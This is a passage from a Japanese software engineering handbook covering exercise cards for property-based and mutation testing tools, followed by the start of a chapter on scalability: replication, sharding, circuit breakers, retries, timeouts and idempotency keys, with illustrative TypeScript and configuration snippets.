> 1. `pnpm --filter @handbook/ch25 exec tsx --test --test-name-pattern="property testing" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch25 run test` で章の4件がすべてpassすることを確認する
> 3. 自作実装で forAll(array(integer(0,10)), xs => xs.length < 2, {cases:100}) を実行し、counterexample を含む例外が投げられれば反例検出が働いていると判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 「値を作る」と「値を縮める」を1つのインタフェースにまとめるのが設計の核。まず integer だけで sample と shrink を作り、forAll のループを通してから他の型へ広げる
> 2. **構造**: Arbitrary<T> を sample: (random) => T と shrink: (value) => Iterable<T> の2メソッドで定義する。乱数は seededRandom で線形合同法を実装して注入し、forAll は失敗時に shrink の候補を順に試して、まだ失敗する最小の候補を保持する
> 3. **実装の要点**: shrink はジェネレータで「より単純な候補」を降順に yield する。整数なら 0 へ向けて半分ずつ、配列なら空配列と前半のスライス。縮小候補が元と同じ値を返すと無限ループになるため、必ず単調に小さくなる系列にする
>
> **本番利用時の警告**
>
> - この実装は shrink を1パスの貪欲探索でしか行わず、record の shrink は空である。複合構造の反例は縮まらないため、実務では fast-check のような多段の縮小と統合的な生成器を持つライブラリを使う
> - 線形合同法の擬似乱数は分布の質が低く、探索が特定の値域に偏る。1000ケース通ったことは性質の証明ではなく、この生成器が到達できた範囲に反例がなかったという弱い証拠にすぎない
> - forAll は失敗を例外として投げるだけで、失敗時の seed をメッセージに含めない。CIで見つかった反例をローカルで再現する手段がないと、property テストは flaky なテストとして無効化される運命をたどるため、本番運用では seed の記録と再実行の仕組みが必須になる
>
> **導線**
>
> - 開始地点: `code/ch25/property-test.ts`
> - 模範解答: `code/ch25/property-test.solution.ts`
>
> **推定時間の内訳**: Arbitrary インタフェースと4種のジェネレータ実装45分、シード付き乱数と forAll ループの実装30分、shrink の実装40分、反例の縮小効果の比較と記録35分
<!-- handbook:exercise:end -->

**要件**:
- ジェネレータ: `integer`、`string`、`array`、`record`
- 1000 ケース自動生成
- 失敗時の Shrinking(最小反例の探索)

```typescript
forAll(integer(), (x) => {
  return reverse(reverse([x])).length === 1;
});

// バグ検出例
forAll(array(integer()), (xs) => {
  return sort(xs).length === xs.length;
}); // → 失敗ケースを shrink して最小反例を表示

forAll(record({ x: integer(), y: integer() }), ({ x, y }) => {
  return add(x, y) === add(y, x);  // 可換則
});
```

模範解答: `code/ch25/property-test.solution.ts`

#### 課題25.4: Mutation Testing ツール (★★★)

**目的**: コードに意図的に変異 (mutation) を加え、テストがそれを検出できるか測る。低検出率 → テストが甘い。

<!-- handbook:exercise:start {"id":"25.4"} -->
> **演習カード 課題25.4** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 25.8 Mutation Testing を読み、カバレッジ率と mutation score が測る対象の違いを説明できる
> - 25.10 何をテストすべきか を読み、生存した変異が示す意味を解釈できる
> - 正規表現の matchAll でマッチ位置 (index) を取り出せる
> - 非同期の判定関数を await しながらループで回せる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] generateMutations() が true と false の反転、>= から >、<= から <、=== から !==、&& から二重パイプ、二重パイプから && の変異を生成する
> - [ ] 同じ演算子が複数箇所に現れる場合、出現ごとに別々の変異が1件ずつ作られる
> - [ ] 各変異が description と source の2キーを持ち、source が元コードの当該1箇所だけを置換した文字列になる
> - [ ] mutationScore() が total と killed と survived と score を返す
> - [ ] 変異が0件のとき score が1になる
> - [ ] テストで検出できなかった変異が survived 配列に description 付きで残る
>
> **期待出力**
>
> - 'if (a >= b && true) return 1' に対して3件以上の変異が生成される
> - mutationScore の戻り値が {total, killed, survived, score} の4キーを持ち、score が killed/total の小数になる
> - 生存した変異は description (例: >=→>) で、どの演算子がどう置き換わったかが読める
>
> **観察項目**
>
> - 全行を実行するがアサーションが弱いテストを用意し、カバレッジ100%でも mutation score が低くなることを実際の数値で確認する
> - 生存した変異のコード片を読み、その分岐条件を検証しているアサーションが本当に存在しないことを確かめる
> - 境界値 (>= と >) の変異が生存する場合、テストデータに境界そのものの値が含まれていないことを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch25 exec tsx --test --test-name-pattern="mutation generator" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch25 run test` で章の4件がすべてpassすることを確認する
> 3. 自作実装で 'return x === 1' に対して mutationScore を取り、total が1、survived が1件になる判定関数を渡せば集計が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 変異の「生成」と「殺せたかの判定」を分離する。生成は純関数にでき、判定はテスト実行という副作用を伴うので、判定を関数として外から注入する形にする
> 2. **構造**: 演算子ごとに 正規表現・置換文字列・説明 の3つ組を配列で持ち、matchAll で全出現位置を取り、slice で前後を挟んで1箇所だけ置換した文字列を作る。mutationScore は各変異を survives 関数へ渡し、true が返ったものを survived に積む
> 3. **実装の要点**: matchAll のグローバル正規表現は lastIndex を共有するため、同じ正規表現オブジェクトを使い回すループでは取りこぼしが起きる。また二重パイプと && の相互変換は、両方を適用すると元に戻る「等価変異」を生むので、置換は必ず1箇所ずつ行う
>
> **本番利用時の警告**
>
> - この実装は AST ではなく正規表現でソース文字列を書き換えるため、文字列リテラルやコメントの中の記号まで変異させる。本文が求める AST パースによる変異とは精度が異なり、実コードに適用すると構文エラーの変異 (そもそも殺されて当然のもの) で score が水増しされる
> - 変異ごとにテスト全体を再実行する設計は、変異数 × テスト時間だけかかる。中規模のプロジェクトでそのままCIに載せると数時間規模になるため、本番では Stryker のように差分実行・並列化・タイムアウト付きの実装を使う
> - mutation score は目標値にすると簡単に歪む指標である。等価変異 (意味が変わらない変異) は原理的に殺せず、100%を目指すと無意味なアサーションを追加する動機になる。低い score を「テストが弱い箇所の発見器」として使うにとどめる
>
> **導線**
>
> - 開始地点: `code/ch25/mutation-test.ts`
> - 模範解答: `code/ch25/mutation-test.solution.ts`
>
> **推定時間の内訳**: 変異オペレータの定義と生成の実装40分、スコア集計の実装25分、弱いテストを用意してカバレッジとの差を比較45分、生存変異の読み取りと記録40分
<!-- handbook:exercise:end -->

**要件**:
- 対象 TypeScript ファイルを読み込む。模範解答は正規表現でソース文字列を置き換える方式を採る。AST パースへの置き換えは読者の発展課題とする
- 変異オペレータ (★ は模範解答が実装済み):
  - ★ `>=` ↔ `>`、`<=` ↔ `<`
  - ★ `===` ↔ `!==`
  - ★ `&&` ↔ `||`
  - ★ `true` ↔ `false`
  - `+` ↔ `-`
- 各変異を適用してテスト実行 → 「殺された」(失敗)/「生存」(成功) を集計
- Mutation Score = 殺された / 全変異

```bash
$ tsx mutation-test.ts ./src/calc.ts ./tests/calc.test.ts

Generated 12 mutations:
  ✓ killed: 10 (83%)
  ✗ survived: 2 (17%)

Surviving mutations (your tests didn't catch these!):
  src/calc.ts:15 - changed > to >=
  src/calc.ts:28 - changed && to ||

Mutation score: 83%
```

模範解答: `code/ch25/mutation-test.solution.ts`

---

<!-- handbook:code-usage:start {"chapter":25} -->
### 第25章のコード集の使い方

<!-- handbook:generated; do not edit -->

コード集は pnpm ワークスペースとして構成してある (CODE_TOOLCHAIN.md)。依存はリポジトリ最上位で一度だけ解決し、章ごとの操作は `--filter` でワークスペースを指定する。

```bash
# 初回のみ。リポジトリ最上位で実行する
pnpm install

# 第25章の模範解答をまとめて検証する
pnpm --filter @handbook/ch25 run test

# 模範解答を個別に実行する
pnpm --filter @handbook/ch25 exec tsx mini-test.solution.ts      # 課題25.1
pnpm --filter @handbook/ch25 exec tsx mock-stub-spy.solution.ts  # 課題25.2
pnpm --filter @handbook/ch25 exec tsx property-test.solution.ts  # 課題25.3
pnpm --filter @handbook/ch25 exec tsx mutation-test.solution.ts  # 課題25.4
```

開始地点は模範解答と同じ場所に置いてある (`<name>.ts` と `<name>.solution.ts`、またはディレクトリ課題の `starter/` と `solution/`)。課題ごとの完成条件と採点手順は本節の演習カードと `code/ch25/README.md` にある。模範解答の多くは関数を export するだけで、実行して意味のある出力が出るかどうかは課題によって異なる。まず `run test` で通し、個別実行は演習カードのテスト方法に従う。
<!-- handbook:code-usage:end -->


ここまでで、機能・セキュリティ・性能を異なる境界で継続検証できるようになった。しかし、利用者数と依存関係が増えると、単一ノードと単一障害を前提にした設計そのものが限界を迎える。第26章では、容量増大と部分障害へ耐える構造を、分散化のコストとともに検討する。

---

<a id="chapter-26"></a>
## 第26章 スケーラビリティとアーキテクチャ

第25章で、重要な振る舞いを境界ごとに検証し、変更による回帰を検出する方法を得た。しかし、利用者数、データ量、依存サービス、組織が増えると、単一ノードで成立した前提そのものが変わる。テストが現在の実装を保証しても、容量限界、ネットワーク分断、リトライの増幅、復旧目標までは自動的に解決しない。

本章では、まずスケールアップとスケールアウトの選択から始め、DB拡張、サービス境界、通信、タイムアウト、リトライ、冪等性、バックプレッシャー、DRまでを一つの障害伝播モデルとして扱う。分散化を目的にせず、どの独立性が必要で、どの複雑さを引き受けるかを判断する。第VII部では、これまでの制約を実際の業務概念と変更作業へ結び付け、設計・リファクタリング・AI活用・総合実装として統合する。
<!-- handbook:chapter-guide:start {"chapter":26} -->
> **この章の学習ガイド**
>
> **解決する実務上の問題**  
> 成長や部分障害に備えながら、早すぎる分散化を避け、容量・整合性・組織境界に合うアーキテクチャを選ぶ。
>
> **到達目標**
> - スケールアップ/アウト、DB拡張、モノリス/マイクロサービスを条件付きで比較できる。
> - timeout、retry、circuit breaker、bulkhead、backpressureを組み合わせられる。
> - RTO/RPOとChaos Engineeringを運用計画へ反映できる。
>
> 到達目標は章全体に対するものである。標準通読ルートは必修節だけを読むため、下の「中核概念」に (実務選択) (発展) (展望) と付いた節がある章では、その節を読むまで到達目標の一部が埋まらない。必修節を読み終えた時点で説明できない項目があれば、まず付記のある節へ進む。
>
> **前提知識**
> - [14.6 ACIDとトランザクション](05-part4-data.md#section-14-6) ― トランザクション
> - [17.1 同期 vs 非同期 ― いつ非同期にすべきか](05-part4-data.md#section-17-1) ― 同期と非同期
> - [22.7 SLI / SLO / SLA](06-part5-infrastructure.md#section-22-7) ― SLO
>
> **中核概念**  
> [26.1 スケールアップ vs スケールアウト](#section-26-1)、[26.2 データベースのスケール](#section-26-2) (実務選択)、[26.3 マイクロサービス vs モノリス](#section-26-3)、[26.5 イベント駆動とサービス間通信](#section-26-5)、[26.6 サーキットブレーカ](#section-26-6)、[26.7 リトライとバックオフ](#section-26-7)、[26.9 タイムアウト戦略 ― レイヤごとの設定指針](#section-26-9)、[26.10 冪等性とリトライ ― 「もう一度」を安全にする](#section-26-10)、[26.11 バックプレッシャー ― 過負荷の連鎖を防ぐ](#section-26-11)
>
> **最小実装**  
> [26.15 実装課題 ― 耐障害性パターンを実装する](#section-26-15) (実務選択)
>
> **本番実装との差分**
> - 耐障害パターンの最小実装は分散状態、監視、設定配布、容量制御を省略する。単体導入ではなく全体のtimeout budgetで設計する。
>
> **典型的な失敗**
> - 無制限retryで障害を増幅する。
> - マイクロサービス化を組織問題の万能解とする。
> - RTO/RPOを決めずバックアップだけ取る。
>
> **診断・デバッグ方法**
> - 依存グラフ、timeout budget、queue長、retry数、saturationを追う。
> - ゲームデイで復旧手順と観測を検証する。
>
> **意思決定チェックリスト**
> - 現在の制約は容量、組織、可用性、変更頻度のどれか。
> - 分割で得る独立性が分散コストを上回るか。
>
> **演習と評価基準**  
> 対象: [26.15 実装課題 ― 耐障害性パターンを実装する](#section-26-15) (実務選択)
> - 故障注入下で過負荷が連鎖せず、復旧条件を説明できる。
>
> **一次資料・発展資料**
> - Release It! patterns
> - Google SRE books
> - AWS Builders Library
> - Reactive Streams specification
<!-- handbook:chapter-guide:end -->

<a id="section-26-1"></a>
### 26.1 スケールアップ vs スケールアウト
<!-- handbook:learning {"level":"required","minutes":10} -->
<!-- handbook:index {"group":"S","term":"Sticky Session"} -->
<!-- handbook:index {"group":"さ行","term":"スケールアウト"} -->
<!-- handbook:index {"group":"さ行","term":"スケールアップ"} -->
<!-- handbook:index {"group":"さ行","term":"ステートレス"} -->

<!-- handbook:narrative-bridge {"section":"26.1"} -->
テストは現在の境界で期待した振る舞いを守るが、負荷が増えると単一ノードの容量という前提が崩れる。まずスケールアップとスケールアウトを比較し、どの資源制約をどの複雑さと交換するかを考える。

- **スケールアップ (Vertical)**: 1台のサーバを強くする (CPU、メモリ増)
- **スケールアウト (Horizontal)**: サーバを増やす

スケールアップは限界がある (最大のマシンが上限) が、設計が楽。スケールアウトは無限に伸びる可能性があるが、ステートレス化や分散の難しさを引き受ける。

**ステートレスにする:**

Web サーバ自身に状態を持たない。

- セッションは Redis や Cookie に
- アップロードファイルは S3 に
- 一時データはDBに

これでサーバを N 台並べても、どこに来ても同じ処理ができる。

**Sticky Session (Session Affinity) ― ステートフルにせざるを得ない時:**

「同じユーザーは同じサーバに割り振り続ける」のが Sticky Session。WebSocket(セッション中の状態を保持したい)、In-memory キャッシュ多用、レガシーアプリ移行などで使う。

```nginx
# Nginx の場合 (ip_hash)
upstream backend {
  ip_hash;  # クライアントIPでサーバを決定
  server app1:3000;
  server app2:3000;
  server app3:3000;
}
```

```yaml
# AWS ALB の場合
TargetGroup:
  Properties:
    TargetGroupAttributes:
      - Key: stickiness.enabled
        Value: 'true'
      - Key: stickiness.type
        Value: lb_cookie
      - Key: stickiness.lb_cookie.duration_seconds
        Value: '3600'
```

**欠点:**
- スケールアウト効率が落ちる (特定サーバに偏る可能性)
- そのサーバが落ちるとセッションロスト
- ローリングデプロイ時に Sticky だったセッションが切れる

「**できるだけステートレスにし、本当に必要な部分だけ Sticky**」が原則。WebSocket 接続自体は Sticky にせざるを得ないが、その背後のデータは Redis/DB で共有しておく。

<a id="section-26-2"></a>
### 26.2 データベースのスケール
<!-- handbook:learning {"level":"practical","minutes":10} -->
<!-- handbook:index {"group":"D","term":"DynamoDB"} -->
<!-- handbook:index {"group":"R","term":"Replication"} -->

<!-- handbook:narrative-bridge {"section":"26.2"} -->
Web層を水平に増やしても、すべての要求が同じDBへ集中すれば次のボトルネックになる。データベースのスケールでは、読み書き、整合性、分割単位を分けて拡張方法を選ぶ。

アプリのスケールアウトは比較的容易だが、DBはそうはいかない。

**レプリケーション (読み書き分離):**

```text
[Primary (書き)] → 非同期レプリケート → [Replica 1 (読み)]
                                      → [Replica 2 (読み)]
                                      → [Replica N (読み)]
```

書き込みは Primary、読み込みは Replica。読みのスケールができる。

```typescript
// Prisma で読み書きを分ける例 (Read Replica plugin)
const writeDb = new PrismaClient({ datasources: { db: { url: PRIMARY_URL } } });
const readDb = new PrismaClient({ datasources: { db: { url: REPLICA_URL } } });

// 書き込み
await writeDb.user.create({ data: { ... } });

// 読み込み (レプリカ)
const user = await readDb.user.findUnique({ where: { id } });
```

**レプリケーション遅延の罠:**

非同期レプリは数ms〜数秒の遅延がある。「ユーザーが投稿直後に自分のタイムラインを見たら、まだ反映されていない」現象が起きる。対策:

- 書き込み直後の同一ユーザーの読みは Primary に向ける
- レプリ遅延を許容できる用途 (一覧、検索、集計) だけ Replica へ

**シャーディング (水平分割):**

データを複数のDBに分散。

```text
ユーザーID 1-1,000,000   → DB1
ユーザーID 1,000,001-2M  → DB2
...
```

または、ハッシュベース:

```text
hash(userId) % N でどのDBか決定
```

**シャーディングの難しさ:**

- 複数シャードを跨ぐクエリが困難
- リシャーディング (シャード追加・分割) が大変
- トランザクションが効かない

PostgreSQL なら Citus 拡張、MySQL なら Vitess、または DynamoDB のように最初からシャード前提のDBを選ぶ。

シャーディングは**本当に必要になってから**。多くのサービスは、まず1台のPostgreSQLを縦に強化 (vCPU 64、メモリ 256GBなど) + リードレプリカで数千万ユーザーまで戦える。

<a id="section-26-3"></a>
### 26.3 マイクロサービス vs モノリス
<!-- handbook:learning {"level":"required","minutes":10} -->
<!-- handbook:index {"group":"M","term":"Microservices"} -->
<!-- handbook:index {"group":"M","term":"Modular Monolith"} -->
<!-- handbook:index {"group":"あ行","term":"アーキテクチャ"} -->
<!-- handbook:index {"group":"ま行","term":"マイクロサービス"} -->
<!-- handbook:index {"group":"ま行","term":"モジュラモノリス"} -->

<!-- handbook:narrative-bridge {"section":"26.3"} -->
DBを拡張しても、アプリケーション全体を一つの配置単位として変更すると、組織とリリースの独立性に限界が出る。モノリスとマイクロサービスは、実行単位と運用責任をどこで分けるかの選択である。

2010年代半ばに「マイクロサービス」が流行した。しかし2026年現在、揺り戻しが起きている。

**マイクロサービスの利点:**

- サービスごとに独立デプロイ
- 言語・技術選択の自由
- 障害の隔離
- チーム独立性

**マイクロサービスの欠点 (深刻):**

- 分散システムの複雑さ (ネットワーク失敗、リトライ、トランザクション)
- デバッグが困難 (1リクエストが何サービス跨ぐか)
- インフラ運用コスト (サービス数の倍数で増える)
- 共通変更が困難 (10サービスにまたがる変更)

Prime Video の音声・映像品質監視チームが2023年に公開した事例では、Step Functions と Lambda による分散構成を単一プロセスへ統合し、運用コストを大きく下げたと報告している。ただしこれは1チームの1機能の話であり、Amazon がマイクロサービスをやめたという意味ではない。

**近ごろ選ばれる中間解: モジュラモノリス**

「**コードベース内で論理的に分離する、デプロイは1つ**」というアプローチ。Shopify などが採用。

```text
src/
  modules/
    users/       # ユーザー管理
      api/
      domain/
      data/
    payments/    # 決済
      api/
      domain/
      data/
    orders/      # 注文
      ...
  shared/        # 共通基盤
```

各モジュールは:

- 内部実装は隠蔽 (他モジュールは API だけ呼べる)
- 自分のテーブルだけ触る
- 自分の境界内でトランザクション

これにより、マイクロサービスの利点 (分離・独立性) を、モノリスのシンプルさで得る。後で本当に必要なサービスだけ切り出せる。

<a id="section-26-4"></a>
### 26.4 サービス分割の単位 ― Bounded Context
<!-- handbook:learning {"level":"practical","minutes":5} -->
<!-- handbook:index {"group":"B","term":"Bounded Context"} -->

<!-- handbook:narrative-bridge {"section":"26.4"} -->
サービス数を増やすだけでは、依存が絡んだ分散モノリスになる。Bounded Contextは、同じ用語と不変条件を共有する業務境界から、変更の独立性を設計する。

「どこで分けるか」は DDD (Domain-Driven Design、ドメイン駆動設計) の **Bounded Context** で考える。

例: EC サイト

- 商品カタログ Context (商品マスタ、カテゴリ)
- 注文 Context (カート、決済、配送)
- 顧客 Context (アカウント、認証、プロファイル)
- 在庫 Context (倉庫、入出庫)
- マーケティング Context (クーポン、レコメンド)

これらは異なる言葉、異なる関心、異なる変更速度を持つ。同じ「商品」でも、カタログでは「タイトル、説明、画像」だが、在庫では「SKU、ロット、入荷予定」と意味が違う。

**境界の引き方:**

- 言葉が違ってくる箇所
- 変更が独立する箇所
- チームが分かれる箇所

<a id="section-26-5"></a>
### 26.5 イベント駆動とサービス間通信
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"あ行","term":"イベント駆動"} -->

<!-- handbook:narrative-bridge {"section":"26.5"} -->
境界を分けると、同一プロセス内の呼び出しはネットワーク越しの通信へ変わる。イベント駆動とサービス間通信では、同期性、整合性、失敗時の再処理を契約として選ぶ。

サービスを分けたら、互いにどう通信するか。

**同期 (REST、gRPC):**

```text
注文サービス →[POST /charge]→ 決済サービス → 応答待ち
```

シンプルだが、決済サービスがダウンすると注文も失敗する (障害の連鎖)。

**非同期 (メッセージング):**

```text
注文サービス → [event: OrderCreated] → Queue → 決済サービス
                                              → メールサービス
                                              → 分析サービス
```

各サービスが独立してイベントを処理。失敗してもキューにメッセージが残り、リトライできる。

**現代的な指針:**

- サービス内: 同期
- サービス間: できる限り非同期
- 同期が必要な経路は、サーキットブレーカでフェイルファスト

<a id="section-26-6"></a>
### 26.6 サーキットブレーカ
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"さ行","term":"サーキットブレーカ"} -->

<!-- handbook:narrative-bridge {"section":"26.6"} -->
リモート依存は遅延や失敗を避けられず、呼び出し続けると自サービスの資源まで枯渇する。サーキットブレーカは、失敗が続く依存を一時的に遮断し、回復確認まで負荷を止める。

下流サービスが不調なとき、リクエストを止めて自分も巻き込まれないようにする仕組み。

```typescript
import CircuitBreaker from 'opossum';

const breaker = new CircuitBreaker(
  async (input: string) => callDownstream(input),
  {
    timeout: 3000,                // 3秒で諦める
    errorThresholdPercentage: 50, // 50% エラーで open
    resetTimeout: 30000,          // 30秒後に half-open
  }
);

breaker.fallback(() => ({ status: 'degraded' }));

const result = await breaker.fire('input');
```

状態遷移:

- **Closed**: 通常 (全リクエストを通す)
- **Open**: 異常 (全リクエストを即失敗、下流に投げない)
- **Half-open**: 復旧確認 (一部のリクエストを試して、成功すれば Closed へ)

サーバ全体が「カスケード障害」で巻き込まれるのを防ぐ。

<a id="section-26-7"></a>
### 26.7 リトライとバックオフ
<!-- handbook:learning {"level":"required","minutes":10} -->
<!-- handbook:index {"group":"ら行","term":"リトライ"} -->

<!-- handbook:narrative-bridge {"section":"26.7"} -->
遮断は継続障害を抑えるが、一時的な競合や瞬断ならリトライで回復できる。リトライとバックオフは、回復機会を与えつつ、同時リトライによる負荷集中を避ける。

ネットワーク的な一時的失敗は、リトライで救える。ただし**指数バックオフ + ジッタ**が必須。

```typescript
async function retryWithBackoff<T>(
  fn: () => Promise<T>,
  maxRetries = 5
): Promise<T> {
  let lastError: Error | undefined;
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (e) {
      lastError = e as Error;
      if (!isRetryable(e)) throw e;

      // 指数バックオフ + ランダムジッタ
      const baseDelay = Math.min(1000 * Math.pow(2, i), 30000);
      const jitter = Math.random() * baseDelay * 0.3;
      await sleep(baseDelay + jitter);
    }
  }
  throw lastError;
}
```

**ジッタが重要な理由:**

サーバが復旧した瞬間、全クライアントが同時にリトライすると、また落ちる (Thundering Herd)。ジッタで時間をばらすと、負荷が分散する。

**冪等でない処理のリトライに注意:**

支払いなどはリトライで二重実行されないよう、冪等キーを使う。

```typescript
await fetch('/payments', {
  method: 'POST',
  headers: { 'Idempotency-Key': uuid() },
  body: JSON.stringify({ amount: 1000 }),
});
// 同じIdempotency-Key なら、サーバは1回しか処理しない
```

<a id="section-26-8"></a>
### 26.8 Bulkhead (隔壁) パターン
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"B","term":"Bulkhead パターン"} -->

<!-- handbook:narrative-bridge {"section":"26.8"} -->
バックオフしても、多数の要求が同じ依存へ流れれば、待機中の資源がサービス全体を占有する。Bulkheadは依存や処理種別ごとに資源上限を分け、局所障害の波及を抑える。

「**ある機能の障害が、他の機能を巻き込まないようにする**」設計。

例: ユーザー API と分析バッチが、同じ DB コネクションプールを共有していると、分析の重いクエリでプールが枯渇し、ユーザー API も止まる。

```text
[Web API] → [Pool: 80 connections] ─┐
                                     ├→ [PostgreSQL]
[Analytics] → [Pool: 20 connections] ┘
```

このように、リソースを分離する。プールを分ける、別インスタンスにする、別 DB に分けるなど、段階がある。

<a id="section-26-9"></a>
### 26.9 タイムアウト戦略 ― レイヤごとの設定指針
<!-- handbook:learning {"level":"required","minutes":10} -->
<!-- handbook:index {"group":"た行","term":"タイムアウト"} -->

<!-- handbook:narrative-bridge {"section":"26.9"} -->
資源を隔離しても、各層が独立した長いタイムアウトを持つと、利用者の期限を超えて処理が残り続ける。タイムアウト戦略では、要求全体の予算を下流へ配分する。

「**サービスがハングしている**」「**応答しない呼び出しに無限に待たされる**」のは、設定漏れたタイムアウトが原因。本番運用で**最も頻繁に役立つ知識**の一つ。

#### Cascading Timeout の考え方

呼び出しチェーンの上流から下流へ、タイムアウトは**短くなる**ように設定する。

```text
[Client] ──5s──> [API Gateway] ──4s──> [Service A] ──3s──> [Service B] ──2s──> [DB]
```

逆だと「下流が長く待つので、上流のタイムアウトが先に発火 → 下流の処理は無駄に継続」となり、リソースが浪費される。

#### レイヤごとの推奨

```typescript
// HTTP クライアント (外部 API 呼び出し)
import { fetch } from 'undici';

async function callExternalApi(url: string): Promise<Response> {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 3000);  // 3秒
  try {
    return await fetch(url, { signal: controller.signal });
  } finally {
    clearTimeout(timeoutId);
  }
}

// DB クエリタイムアウト (Postgres)
// 接続URLのクエリパラメータはドライバごとに解釈が違う。Prisma の PostgreSQL
// コネクタは statement_timeout を解釈しないため、書いても黙って無視される。
// サーバ側の既定値として効かせたい場合は、ロールかデータベースへ設定する
// ALTER ROLE app_user SET statement_timeout = '5s';

// アプリから確実に効かせるなら、トランザクションごとに指定する
await db.$transaction(async (tx) => {
  await tx.$queryRaw`SET LOCAL statement_timeout = '2s'`;
  // ...
}, { timeout: 10000 });  // トランザクション全体のタイムアウト

// Express サーバ
import http from 'http';
const server = http.createServer(app);
server.headersTimeout = 60_000;          // ヘッダ受信まで
server.requestTimeout = 30_000;          // リクエスト全体
server.keepAliveTimeout = 65_000;        // Keep-Alive 後の待機。LBの idle timeout より長くする
server.listen(3000);
```

**タイムアウトを設定しないと何が起きるか:**

- TCP は、確立済み接続の読み取り待ちにデフォルトの期限を持たない。`SO_KEEPALIVE` はデフォルトで無効で、有効にしても最初のプローブまでデフォルトで約2時間かかる
- 1リクエストがスタックすると、接続プールが枯渇
- 他のリクエストも処理できなくなる
- カスケード障害

`keepAliveTimeout` だけは「短ければ安全」ではない。ロードバランサの背後に置く場合、アプリ側がLBより先に接続を閉じると、LBが再利用しようとした瞬間に切断が起きて 502 になる。AWS の Application Load Balancer はデフォルトで60秒待つため、アプリ側はそれより長くする。上の65秒はその関係を保つための値である。

「**全ての I/O にタイムアウト**」が鉄則。デフォルトに頼らず、明示的に設定する。

<a id="section-26-10"></a>
### 26.10 冪等性とリトライ ― 「もう一度」を安全にする
<!-- handbook:learning {"level":"required","minutes":15} -->
<!-- handbook:index {"group":"I","term":"IdempotencyKey"} -->
<!-- handbook:index {"group":"ら行","term":"リトライ"} -->

<!-- handbook:narrative-bridge {"section":"26.10"} -->
タイムアウト後にリトライすると、最初の処理が実は成功していた場合に二重実行が起こる。冪等性は、同じ意図を複数回受けても結果を一度分として扱えるようにする。

ネットワークは不安定で、リトライは避けられない。だが冪等でない処理をリトライすると、二重課金や重複データになる。

#### Idempotency Key パターン

```typescript
// クライアント側: 一意なキーを生成してリクエスト
const idempotencyKey = crypto.randomUUID();
await fetch('/api/payments', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Idempotency-Key': idempotencyKey,
  },
  body: JSON.stringify({ amount: 5000 }),
});

// 失敗したら同じキーで再試行 (キーを変えてはいけない)
```

サーバ側で、同じキーは1度しか処理しない。

```typescript
// idempotency 中間層
async function withIdempotency<T>(
  tenantId: string,      // キーの名前空間。要求者を跨いでキーを共有しない
  key: string,
  requestHash: string,   // 要求本文の正規化ハッシュ。同じキーで違う内容を弾くために使う
  ttlSec: number,
  fn: () => Promise<T>,
): Promise<T> {
  // キーは要求者ごとに名前空間を分ける。`idem:${key}` だけだと、他人が同じキーを
  // 送るだけで別テナントの結果を読み出せてしまう
  const cacheKey = `idem:${tenantId}:${key}`;

  // 1. 過去の結果があれば返す。ただし「同じキーで違う内容」は取り違えなので弾く
  const cached = await redis.get(cacheKey);
  if (cached) {
    const entry = JSON.parse(cached);
    if (entry.requestHash !== requestHash) {
      throw new Error('Idempotency-Key reused with a different payload');
    }
    if (entry.status === 'completed') return entry.result;
    if (entry.status === 'processing') {
      throw new Error('Request is already being processed');
    }
  }

  // 2. 「処理中」マーカーを SET NX で取る (排他)
  const acquired = await redis.set(cacheKey, JSON.stringify({ status: 'processing' }), {
    NX: true,
    EX: ttlSec,
  });
  if (!acquired) {
    // 別プロセスが処理中
    throw new Error('Concurrent request');
  }

  try {
    const result = await fn();
    await redis.set(
      cacheKey,
      JSON.stringify({ status: 'completed', requestHash, result }),
      { EX: ttlSec },
    );
    return result;
  } catch (e) {
    // マーカーを消してよいのは「下流に副作用が残っていないと分かるとき」だけである。
    // 送信済みで応答が読めなかった場合に消すと、再送がそのまま二重課金になる
    if (isDefinitelyNotApplied(e)) {
      await redis.del(cacheKey);
    } else {
      await redis.set(cacheKey, JSON.stringify({ status: 'failed', requestHash, error: String(e) }), { EX: ttlSec });
    }
    throw e;
  }
}

// 利用
app.post('/api/payments', async (req, res) => {
  const key = req.headers['idempotency-key'] as string;
  if (!key) return res.status(400).json({ error: 'Idempotency-Key required' });

  try {
    const requestHash = createHash('sha256').update(JSON.stringify(req.body)).digest('hex');
    const result = await withIdempotency(req.user.tenantId, key, requestHash, 86400, async () => {
      return await chargePayment(req.body);
    });
    res.json(result);
  } catch (e) {
    res.status(409).json({ error: (e as Error).message });
  }
});
```

ここまでで「**同じ Idempotency-Key と同じ要求内容なら、課金は1回のみ、結果は同じ**」に近づく。ただし成り立つのは、下流の呼び出しが「適用されたかどうか」を判定できる場合に限る。判定できないまま失敗マーカーを消すと再送が二重課金になるため、上のコードでは適用されていないと確認できたときだけ消している。TTL が切れたあとの再送も守れないので、TTL は再送を試みる期間より長く取る。

Stripe も同じ考え方で、成否によらず結果を保存し、同じキーで来た要求のパラメータが前回と違えばエラーにする。外から渡されたキーだけに頼らず、下流の決済APIにも冪等キーを渡し、二重防御にするのが実務での形である。

#### 自然な冪等性を設計に組み込む

外から渡されるキーに頼らず、操作自体を冪等にする方が堅牢。

```typescript
// BAD: 状態を増やす (冪等でない)
await db.balance.update({
  where: { userId },
  data: { amount: { decrement: 100 } },
});

// GOOD: 「最終状態」を、読んだときのバージョンを条件にして書く (冪等かつ安全)
// 条件を付けずに data: { amount: newBalance } とすると、並行する別の更新を
// 上書きしてしまう (lost update)。冪等性と排他は別の問題である (14.9)
const updated = await db.balance.updateMany({
  where: { userId, version: readVersion },
  data: { amount: newBalance, version: readVersion + 1 },
});
if (updated.count === 0) throw new ConflictError('balance changed, retry');

